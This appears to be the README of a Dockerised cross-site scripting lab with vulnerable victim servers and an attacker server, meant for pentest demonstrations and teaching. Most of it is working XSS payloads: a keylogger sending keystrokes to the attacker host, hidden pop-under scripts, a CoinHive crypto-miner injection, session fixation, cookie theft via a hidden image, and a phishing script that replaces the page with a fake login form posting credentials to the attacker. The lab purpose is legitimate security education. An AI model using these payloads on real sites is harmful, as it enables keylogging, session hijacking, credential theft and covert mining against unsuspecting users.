# XSS Test Project

# Quick Start

`docker-compose up` in `docker` folder

## Entrypoints

- Victim Easy XSS Server: `http://localhost:1185/`
- Victim Session Server: `http://localhost:3000`
- Attacker: See Docker Logs

## Introduction

This project is intended to show and test various XSS Payloads.

### Target Audiences

#### Persuasion 

Often it is difficult to show what can be done with an XSS finding. For example if a pentester wants to persuade a customer of a finding.

This project can be used to persuade people more easily how dangerous a single XSS finding can be.

#### Reconstruction

You can use this project to setup rapidly a possible attack and see if it works and how it works.

#### Education

The project can be used to educate, for example new pentester or people interested in security, about XSS.

## Subfolders

### Attacker Server

`./attackerserver/`

This contains a dockerfile representing the attacker server.

### Easy stored and reflected XSS

`./victimeasyxssserver/`

This cointains a small server application only to check for XSS.

### Advanced XSS attack vectors
`./victimsessionserver/`

This folder contains a server application vulnerable to XSS which has an integrated session management. 

You can use it to check for session attacks.

# Payloads

## Payloads victimeasyxssserver

### Check if XSS is possible

`<script>alert(1)</script>`

### Keylogger

#### Simple Keylogger / Stored XSS

Store in the list:

```
<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
document.onkeypress = zx;
function zx(e){
	var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
	httpGet("http://localhost/c?"+charCode);
}
</script>
```

If you now goto the list and enter keys they will be send to attackerserver.

### Run JavaScript in Background

#### Pop-Under

We create a pop-under where our javascript hook lives. 

Following payload works on the listed browsers if you allow popups for the side:

- Google Chrome 65.0.3325.181
- Firefox 59.0.2
- Safari 11.0.3

```
<script>
var popunder;
var _parent;
function jsPopunder(sUrl) {

sName = "s";
var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';

// create pop-up from parent context
_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
_parent.name = "parent";
var popunder = _parent.window.open(sUrl, sName, sOptions);
if (popunder) {
popunder.blur();
if (navigator.userAgent.indexOf('MSIE') === -1) {
popunder.params = { url: sUrl };
(function(e) {
if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
try {
var poltergeist = document.createElement('a');
poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
document.body.appendChild(poltergeist).click();
}catch(err){}
}
})(popunder);
}
window.focus();
try{ opener.window.focus(); }catch(err){}
}
}
jsPopunder("http://localhost:8000/test.html");
setTimeout(function(){
	window.focus();
	if (_parent) {_parent.window.focus();} 
	goBack = window.open('','parent');
	if (goBack) {goBack.focus();}
}, 100);
</script>
```

#### Crypto-Miner

Start Crypto-Miner in the Pop-Under:

Sign up an account on [CoinHive](https://coinhive.com/)

Payload (change key to your Public Key from CoinHive). 

```
<script>
	var imported = document.createElement('script');
	imported.src = 'https://coinhive.com/lib/coinhive.min.js';
	document.head.appendChild(imported);
	imported.onload = function()
    {
    	var miner = new CoinHive.Anonymous('YOUR SITE KEY (public)');
		miner.start();
    }
</script>
```

On CoinHive check if pending payments are coming in:

![CoinHive Screenshot](README/imgs/screenshot_coinhive.png)

To run miner in pop-under use the following snippet. Change key in attacker server [html file](./docker/attackerserver/serverfiles/coins/miner.html) to your public key: 

```
<script>
var popunder;
var _parent;
function jsPopunder(sUrl) {

sName = "s";
var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';

// create pop-up from parent context
_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
_parent.name = "parent";
var popunder = _parent.window.open(sUrl, sName, sOptions);
if (popunder) {
popunder.blur();
if (navigator.userAgent.indexOf('MSIE') === -1) {
popunder.params = { url: sUrl };
(function(e) {
if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
try {
var poltergeist = document.createElement('a');
poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
document.body.appendChild(poltergeist).click();
}catch(err){}
}
})(popunder);
}
window.focus();
try{ opener.window.focus(); }catch(err){}
}
}
jsPopunder("http://localhost/coins/miner.html");
setTimeout(function(){
	window.focus();
	if (_parent) {_parent.window.focus();} 
	goBack = window.open('','parent');
	if (goBack) {goBack.focus();}
}, 100);
</script> 
```

### Run JavaScript from Attacker-Server

We can use Cross-Messaging (see e.g. [1](https://javascript.info/cross-window-communication) or [2](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate with our xss-hooked application (and to circumvent Same-Origin-Policy).

e.g. (not tested, templates)

Attacker-Server:

doSomething.js:

```
function post(msg) {
	var msg = "Do something"; // Can be string or numeric
	parent.postMessage(msg, '*');
	post();
}
```

In XSS'ed Page:

```<script>
function listener(event) {
	if (event.origin != 'https://myotherdomain.com') {
		return
	}
	var info = event.data;
	DoSomething(info);
}
</script>

// Set up event handler wenn parent page loads

if (window.addEventListener) {
	addEventListener("message", listener, false)
} else {
	attachEvent("onmessage", listener);
}
```

## Payloads victimsessionserver

### Check for session fixation

Simple check to verify XSS can manipulate sessions.

Goto `http://localhost:3000/`

Login with: `admin` / `istrator`

enter

```
<script>
   document.cookie='connect.sid=12345;path=/'
</script>
```

if you are logged out, XSS is possible.

## Session Hijacking / Get Cookies

### By Hidden Image

```
<script>
 img = document.createElement("img");
 img.src = "http://localhost/"+document.cookie;
 img.style.display = "none";
 x = document.getElementsByTagName("BODY")[0];
 x.appendChild(img);
</script>
```
Goto other Browser:

e.g. Firefox:

- Web-Store
- Cookies
- Setup Path and value
- Call [http://localhost:3000/sessionxss/protected](http://localhost:3000/sessionxss/protected)

### Phishing

The attacker runs the code located in [attacker server loginpage directory](./docker/attackerserver/serverfiles/loginpage/). 

To do phishing, a stored XSS is placed which redirects the entered credentials either

- by manipulating the DOM (no URL change in browser, see next section) or
- by redirecting to attacker server, using a mocked HTTP login page (recreated from the original) 

Both ways send the entered data by POST to [login.php](./docker/attackerserver/serverfiles/loginpage/login.php) located on the attacker server. 
[login.php](./docker/attackerserver/serverfiles/loginpage/login.php) uses the received data to fill hidden fields and to do another POST to the original login form.

Next section see the first attack:

#### JavaScript DOM Manipulation and Redirect

Payload:

```
<script>
function removeTree(nodeIterator){
while (nodeIterator.firstChild) {nodeIterator.removeChild(nodeIterator.firstChild);}
}
removeTree(document.body);

var header = document.createElement("header");

var para1 = document.createElement("p");
para1.setAttribute("style","text-align:center;");

var img = document.createElement("img");
img.setAttribute("src","logo.png")
img.setAttribute("alt","Logo");

var form = document.createElement("form");
form.setAttribute("action","http://localhost/loginpage/login.php");
form.setAttribute("method","POST");
form.setAttribute("id","findme");

var para2 = document.createElement("p");
var para2text = document.createTextNode("Enter Login data");

var div1 = document.createElement("div");

var label1 = document.createElement("label");
label1.setAttribute("for","user");
var label1text = document.createTextNode("Username:");

var input1 = document.createElement("input");
input1.setAttribute("name","user");

var div2 = document.createElement("div");

var label2 = document.createElement("label");
label2.setAttribute("for","user");
var label2text = document.createTextNode("Password:");

var input2 = document.createElement("input");
input2.setAttribute("name","pass");
input2.setAttribute("type","password");

var br = document.createElement("br");

var button = document.createElement("button");var body = document.body;
button.setAttribute("type","submit");
var buttontext = document.createTextNode("Login");

body.appendChild(header);
header.appendChild(para1);
header.appendChild(img);
body.appendChild(form);
form.appendChild(para2);
para2.appendChild(para2text);
form.appendChild(div1);
div1.appendChild(label1);
label1.appendChild(label1text);
div1.appendChild(input1);
form.appendChild(br);
form.appendChild(div2);
div2.appendChild(label2);
label2.appendChild(label2text);
div2.appendChild(input2);
form.appendChild(br);
form.appendChild(button);
button.appendChild(buttontext);

window.onload = function () {
	var nodeIt = document.getElementById("findme");
	while (nodeIt.nextSibling){nodeIt = nodeIt.nextSibling;removeTree(nodeIt);
	}}
</script>
```

#### Redirect to Victim Server 

More obvious because of URL change:

```
<script>
window.location.replace("http://localhost/loginpage/LoginPage.htm");
</script>
```

# Configuration in more Detail

## Docker 

### Single Docker Builds

#### Victim Server

goto `victimsessionserver` folder

`docker build -t sessionvictimserver .`
`docker run -ti --rm -p 127.0.0.1:3000:3000 sessionvictimserver`

visit [http://localhost:3000/sessionxss/login](http://localhost:3000/sessionxss/login)

#### Attacker Server

- goto `attackerserver` folder
- run `docker build -t xss_attack_server .`
- run `docker run --rm -ti -p 127.0.0.1:80:80 xss_attack_server .`

## Just Code 

### Attacker Server
goto `attackerserver/serverfiles`

### Victim Session Server

- goto `victimsessionserver/serverfiles`
- run `npm install`
- run: `node index.js`
- goto: `http://localhost:3000/sessionxss/login`

### Victim Easy XSS Server

- goto `victimeasyxssserver/serverfiles`
- run `npm install`
- run: `node index.js`
- goto: `http://localhost:3000/sessionxss/login`

# Todo / Roadmap

- [-] Portscan from Pop-Under
- [-] BeEF 
- [-] Permanent CSRF Attacks against other Website through XSS
- [-] JavaScript Modification Framework, change XSSed site dynamically 
- [-] Enumerate Client Information
- [-] use Client Information to list exploits
- [-] Heap Exploits
- [-] Spectre


